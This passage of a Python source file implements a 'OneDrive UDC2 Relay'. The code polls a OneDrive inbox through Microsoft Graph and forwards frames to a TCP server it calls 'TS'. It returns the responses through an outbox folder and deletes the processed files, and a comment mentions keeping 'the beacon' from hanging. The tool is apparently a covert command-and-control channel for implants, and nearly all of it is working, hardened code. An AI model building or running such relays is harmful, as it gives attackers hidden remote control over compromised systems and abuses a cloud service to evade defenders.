                log.error("[%s] Failed to send to TS: %s", sess.session_id, e)
                sess.close()
                _quarantine_with_abort(graph, config, item_id, item_name,
                                       seen_ids, inflight, lock, state_store,
                                       "ambiguous send for %s" % item_name)
                return

            try:
                response = sess.ts.recv_full_frame(timeout=30.0)
            except Exception as e:
                log.error("[%s] Failed to recv from TS: %s", sess.session_id, e)
                sess.close()
                _quarantine_with_abort(graph, config, item_id, item_name,
                                       seen_ids, inflight, lock, state_store,
                                       "ambiguous recv for %s" % item_name)
                return

            if not response:
                log.warning("[%s] No response  - quarantining", sess.session_id)
                sess.close()
                _quarantine_with_abort(graph, config, item_id, item_name,
                                       seen_ids, inflight, lock, state_store,
                                       "timeout recv for %s" % item_name)
                return

            if len(response) > MAX_FRAME_SIZE:
                log.error("[%s] Response too large: %d bytes",
                          sess.session_id, len(response))
                _quarantine_with_abort(graph, config, item_id, item_name,
                                       seen_ids, inflight, lock, state_store,
                                       "oversized response for %s" % item_name)
                return

        try:
            spool_name, data_hash = state_store.write_spool(
                item_id, item_name, response)
            state_store.record_pending(
                item_id, item_name, spool_name, len(response), data_hash)
        except Exception as e:
            log.critical("[%s] Spool failure, halting relay: %s", sess.session_id, e)
            state_store.mark_failed(
                "spool write failed for %s: %s" % (item_id, e))
            return
        with lock:
            seen_ids.add(item_id)

        try:
            graph.upload_file(drive_id, outbox, item_name, response)
            log.info("[%s] Response: %d bytes -> %s",
                     sess.session_id, len(response), item_name)
        except Exception as e:
            log.error("[%s] Upload failed, spooled for retry: %s", sess.session_id, e)
            return

        deleted = graph.delete_file(drive_id, item_id)
        state_store.complete_pending(item_id, deleted)
    finally:
        state_store.release_pending_reservation(item_id)
        with lock:
            inflight.discard(item_id)


# send an empty frame when we're unsure if TS got the data so the beacon doesn't hang
def _quarantine_with_abort(graph, config, item_id, item_name,
                           seen_ids, inflight, lock, state_store, reason):
    abort_frame = struct.pack("<I", 0)
    try:
        spool_name, data_hash = state_store.write_spool(
            item_id, item_name, abort_frame)
        state_store.record_pending(
            item_id, item_name, spool_name, len(abort_frame), data_hash)
    except Exception as e:
        state_store.mark_failed("abort spool failed for %s: %s" % (item_id, e))
        with lock:
            inflight.discard(item_id)
        log.critical("Cannot spool abort for %s, halting: %s", item_id, e)
        return
    with lock:
        inflight.discard(item_id)
        seen_ids.add(item_id)
    log.critical("Quarantined %s with abort response: %s", item_id, reason)

    try:
        graph.upload_file(
            config["drive_id"], config["outbox_folder_id"],
            item_name, abort_frame)
        log.info("Abort response uploaded for %s", item_name)
    except Exception as e:
        log.error("Abort upload failed for %s, spooled for retry: %s", item_name, e)
        return

    deleted = graph.delete_file(config["drive_id"], item_id)
    state_store.complete_pending(item_id, deleted)


def _finish_item(graph, drive_id, item_id, seen_ids, inflight, lock, state_store):
    deleted = graph.delete_file(drive_id, item_id)
    with lock:
        inflight.discard(item_id)
        seen_ids.add(item_id)
    if deleted:
        state_store.remember_seen([item_id])
    else:
        state_store.remember_seen([item_id], cleanup=True)


def _retry_pending(graph, config, state_store):
    state_store.assert_config(config)
    drive_id = config["drive_id"]
    outbox = config["outbox_folder_id"]
    pending = state_store.pending_snapshot()
    for item_id in pending:
        entry = state_store.try_claim_pending(item_id)
        if entry is None:
            continue
        try:
            manifest_stage = state_store.read_manifest_stage(item_id, entry)
            if manifest_stage == "completed":
                log.info("Spool %s already completed, skipping upload", entry["spool"])
                deleted = graph.delete_file(drive_id, item_id)
                state_store.complete_pending(item_id, deleted)
                continue
            try:
                response = state_store.read_spool(entry["spool"], entry["size"])
            except Exception as e:
                log.error("Missing spool %s for %s, keeping pending: %s",
                          entry["spool"], item_id, e)
                continue
            if len(response) != entry.get("size", -1):
                log.error("Spool %s size mismatch (%d vs %d), keeping pending",
                          entry["spool"], len(response), entry.get("size", -1))
                continue
            expected_hash = entry.get("hash")
            if expected_hash and hashlib.sha256(response).hexdigest() != expected_hash:
                log.error("Spool %s hash mismatch, keeping pending", entry["spool"])
                continue
            if len(response) < 4:
                log.critical("Spool %s too small for frame header, keeping pending", entry["spool"])
                continue
            declared = struct.unpack("<I", response[:4])[0]
            if declared != len(response) - 4:
                log.critical("Spool %s has invalid frame header, keeping pending", entry["spool"])
                continue
            try:
                graph.upload_file(drive_id, outbox, entry["name"], response)
                log.info("Pending upload succeeded: %s", entry["name"])
            except Exception as e:
                log.warning("Pending upload retry failed for %s: %s", entry["name"], e)
                continue
            deleted = graph.delete_file(drive_id, item_id)
            state_store.complete_pending(item_id, deleted)
        finally:
            state_store.release_pending_claim(item_id)


def relay_loop(graph, config, ts_addr, ts_port, poll_interval=2.0,
               *, state_store, shutdown_event=None):
    state_store.assert_config(config)
    drive_id = config["drive_id"]
    inbox = config["inbox_folder_id"]

    seen_ids = set()
    inflight = set()
    lock = threading.Lock()
    sessions = {}
    worker_sem = threading.Semaphore(MAX_WORKERS)
    last_cleanup = time.time()
    if shutdown_event is None:
        shutdown_event = threading.Event()
    active_workers = []
    active_workers_lock = threading.Lock()

    seen_ids.update(state_store.seen_snapshot())

    log.info("Relay started (poll every %.1fs, max %d workers, max %d sessions)",
             poll_interval, MAX_WORKERS, MAX_SESSIONS)
    log.info("  Drive: %s", drive_id)
    log.info("  Inbox: %s", inbox)
    log.info("  Outbox: %s", config["outbox_folder_id"])

    while not shutdown_event.is_set():
        try:
            state_store.assert_healthy()
        except RelayStatePersistenceError as e:
            log.critical("Relay stopped: %s", e)
            shutdown_event.set()
            break
        try:
            _retry_pending(graph, config, state_store)

            if shutdown_event.is_set():
                break

            items = graph.list_files(drive_id, inbox, top=50)

            for item in items:
                if shutdown_event.is_set():
                    break
                item_id = item.get("id", "")
                name = item.get("name", "")

                with lock:
                    if item_id in seen_ids or item_id in inflight:
                        continue

                m = SESSION_RE.match(name)
                if not m:
                    with lock:
                        seen_ids.add(item_id)
                    state_store.remember_seen([item_id])
                    continue

                sid = m.group(1)

                if sid not in sessions and len(sessions) >= MAX_SESSIONS:
                    log.warning("Session capacity full, deferring %s", name)
                    continue

                try:
                    file_data = graph.download_file(drive_id, item_id)
                except ValueError as e:
                    log.warning("Oversized file %s: %s  - quarantining", name, e)
                    with lock:
                        seen_ids.add(item_id)
                    state_store.remember_seen([item_id], cleanup=True)
                    if graph.delete_file(drive_id, item_id):
                        state_store.acknowledge_deleted([item_id])
                    continue
                except Exception as e:
                    log.warning("Failed to download %s: %s", name, e)
                    continue

                if not _valid_frame(file_data, sid):
                    _finish_item(graph, drive_id, item_id, seen_ids, inflight, lock, state_store)
                    continue

                with lock:
                    inflight.add(item_id)

                if sid not in sessions:
                    sessions[sid] = SessionState(sid, ts_addr, ts_port)
                sess = sessions[sid]
                sess.last_active = time.time()

                acquired = False
                while not shutdown_event.is_set():
                    if worker_sem.acquire(timeout=0.5):
                        acquired = True
                        break
                if not acquired:
                    with lock:
                        inflight.discard(item_id)
                    break
                t = None
                try:
                    t = threading.Thread(
                        target=_worker_wrapper,
                        args=(worker_sem, active_workers, active_workers_lock,
                              process_file, graph, config, sess,
                              item_id, name, file_data, seen_ids, inflight,
                              lock, state_store),
                    )
                    with active_workers_lock:
                        active_workers.append(t)
                    t.start()
                except Exception as e:
                    worker_sem.release()
                    if t is not None:
                        with active_workers_lock:
                            try:
                                active_workers.remove(t)
                            except ValueError:
                                pass
                    with lock:
                        inflight.discard(item_id)
                    log.error("Failed to start worker: %s", e)

            now = time.time()
            stale = [s for s, st in sessions.items()
                     if now - st.last_active > SESSION_TIMEOUT]
            for s in stale:
                log.info("Closing stale session %s", s)
                sessions[s].close()
                del sessions[s]

            if now - last_cleanup > CLEANUP_INTERVAL:
                pending_ids = set(state_store.pending_snapshot().keys())
                pending_del = []
                for fid in state_store.cleanup_snapshot():
                    if fid in pending_ids:
                        continue
                    if graph.delete_file(drive_id, fid):
                        pending_del.append(fid)
                if pending_del:
                    state_store.acknowledge_deleted(pending_del)
                    log.info("Periodic cleanup: deleted %d", len(pending_del))
                try:
                    stale_outbox = _cleanup_stale_outbox(
                        graph, config, state_store, now=now)
                    if stale_outbox:
                        log.info("Periodic cleanup: deleted %d stale outbox files",
                                 stale_outbox)
                except Exception as e:
                    log.warning("Stale outbox cleanup failed: %s", e)
                last_cleanup = now

            with lock:
                if len(seen_ids) > MAX_PERSISTED_SEEN_IDS:
                    keep = inflight.copy()
                    keep.update(state_store.cleanup_snapshot())
                    keep.update(state_store.pending_snapshot().keys())
                    removable = [x for x in seen_ids if x not in keep]
                    excess = len(removable) - 1000
                    if excess > 0:
                        for rid in removable[:excess]:
                            seen_ids.discard(rid)

        except RelayStatePersistenceError as e:
            log.critical("Relay stopped: %s", e)
            state_store.mark_failed(str(e))
            shutdown_event.set()
        except KeyboardInterrupt:
            with active_workers_lock:
                alive_count = sum(t.is_alive() for t in active_workers)
            log.info("Shutting down  - waiting for %d worker(s)...", alive_count)
            shutdown_event.set()
            break
        except Exception as e:
            log.error("Relay error: %s", e)

        if shutdown_event.is_set():
            break

        try:
            shutdown_event.wait(poll_interval)
        except KeyboardInterrupt:
            log.info("Shutting down  - waiting for active workers...")
            shutdown_event.set()
            break

    with active_workers_lock:
        workers_to_join = list(active_workers)
    for t in workers_to_join:
        t.join()

    for sess in sessions.values():
        sess.close()

    state_store.assert_healthy()
    return 0


def _worker_wrapper(sem, active_workers, active_workers_lock, fn, *args):
    try:
        fn(*args)
    finally:
        sem.release()
        me = threading.current_thread()
        with active_workers_lock:
            try:
                active_workers.remove(me)
            except ValueError:
                pass


def main():
    parser = argparse.ArgumentParser(description="OneDrive UDC2 Relay")
    parser.add_argument("--config", required=True)
    parser.add_argument("--ts-addr")
    parser.add_argument("--ts-port", type=int)
    parser.add_argument("--poll", type=float, default=2.0)
    parser.add_argument("--state")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--clean", action="store_true",
                        help="delete the state file and spool directory, then exit")
    args = parser.parse_args()
    if not args.clean and (args.ts_addr is None or args.ts_port is None):
        parser.error("--ts-addr and --ts-port are required unless --clean is used")
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    try:
        with open(args.config, encoding="utf-8") as f:
            config = json.load(f)
        state_binding(config)

        state_path = args.state or config.get("state_file") or (args.config + ".state.json")

        state_dir = os.path.dirname(state_path) or "."
        os.makedirs(state_dir, exist_ok=True)

        with open(state_path + ".lock", "a") as lock_fd:
            try:
                fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except BlockingIOError:
                if args.clean:
                    print("[-] Cannot clean: another relay holds the lock: %s.lock"
                          % state_path, file=sys.stderr)
                else:
                    print("[-] Another relay holds the lock: %s.lock"
                          % state_path, file=sys.stderr)
                return 1

            if args.clean:
                return _clean_state(state_path, lock_fd)

            if not isinstance(config.get("client_secret"), str) or not config["client_secret"]:
                raise ValueError("missing or invalid client_secret")
            outbox_ttl = config.get("outbox_ttl_seconds", DEFAULT_OUTBOX_TTL_SECONDS)
            if (not isinstance(outbox_ttl, int) or isinstance(outbox_ttl, bool)
                    or (outbox_ttl != 0 and outbox_ttl < 3600)):
                raise ValueError("outbox_ttl_seconds must be 0 or an integer >= 3600")

            state_store = RelayStateStore(state_path, config)
            return _run_relay(args, config, state_store)
    except Exception as e:
        print("[-] Relay failed: %s" % e, file=sys.stderr)
        return 1


def _clean_state(state_path, lock_fd):
    import shutil
    removed = []
    for path in [state_path, state_path + ".spool"]:
        if os.path.isdir(path):
            shutil.rmtree(path)
            removed.append(path)
        elif os.path.exists(path):
            os.unlink(path)
            removed.append(path)
    lock_fd.truncate(0)
    if removed:
        for p in removed:
            log.info("Removed: %s", p)
    else:
        log.info("Nothing to clean (no state files found)")
    return 0


def _run_relay(args, config, state_store):
    state_path = state_store.path
    graph = GraphClient(config["tenant_id"], config["client_id"], config["client_secret"])

    try:
        graph._ensure_token()
    except requests.exceptions.HTTPError as e:
        status = e.response.status_code if e.response is not None else None
        if status == 401:
            print("[-] Auth failed: invalid client_id or client_secret", file=sys.stderr)
        elif status == 400:
            body = ""
            try:
                body = e.response.json().get("error_description", "")
            except Exception:
                pass
            if "tenant" in body.lower() or "not found" in body.lower():
                print("[-] Auth failed: tenant_id not found", file=sys.stderr)
            else:
                print("[-] Auth failed: %s" % (body or e), file=sys.stderr)
        else:
            print("[-] Auth failed: %s" % e, file=sys.stderr)
        return 1
    except Exception as e:
        print("[-] Auth failed: %s" % e, file=sys.stderr)
        return 1

    if state_store.initialized:
        log.info("Loaded %d seen IDs from %s", len(state_store.seen_snapshot()), state_path)
    else:
        try:
            stale_ids = set()
            now = time.time()
            existing = graph.list_files(config["drive_id"], config["inbox_folder_id"], top=50)
            for item in existing:
                item_id = item.get("id")
                if not item_id:
                    continue
                timestamp = item.get("lastModifiedDateTime") or item.get("createdDateTime")
                try:
                    modified = _parse_graph_timestamp(timestamp)
                except (TypeError, ValueError):
                    stale_ids.add(item_id)
                    continue
                if now - modified > 1800:  # skip inbox files older than 30 min on first run
                    stale_ids.add(item_id)
            state_store.initialize(stale_ids)
            fresh = len(existing) - len(stale_ids)
            log.info("Initialized  - skipping %d stale inbox files, processing %d recent",
                     len(stale_ids), fresh)
        except Exception as e:
            print("[-] Failed to initialize: %s" % e, file=sys.stderr)
            return 1

    state_store.clean_orphan_spools()
    state_store.recover_interrupted_deliveries()
    _retry_pending(graph, config, state_store)

    pending_ids = set(state_store.pending_snapshot().keys())
    deleted_ids = []
    for fid in state_store.cleanup_snapshot():
        if fid in pending_ids:
            continue
        if graph.delete_file(config["drive_id"], fid):
            deleted_ids.append(fid)
    if deleted_ids:
        state_store.acknowledge_deleted(deleted_ids)
        log.info("Reconciled %d pending deletions", len(deleted_ids))

    shutdown_event = threading.Event()

    def request_shutdown(signum, _frame):
        if not shutdown_event.is_set():
            log.info("Shutdown signal %d received  - finishing active workers", signum)
        shutdown_event.set()

    previous_sigint = signal.getsignal(signal.SIGINT)
    previous_sigterm = signal.getsignal(signal.SIGTERM)
    signal.signal(signal.SIGINT, request_shutdown)
    signal.signal(signal.SIGTERM, request_shutdown)
    try:
        return relay_loop(graph, config, args.ts_addr, args.ts_port,
                   poll_interval=args.poll, state_store=state_store,
                   shutdown_event=shutdown_event)
    finally:
        signal.signal(signal.SIGINT, previous_sigint)
        signal.signal(signal.SIGTERM, previous_sigterm)


if __name__ == "__main__":
    sys.exit(main())
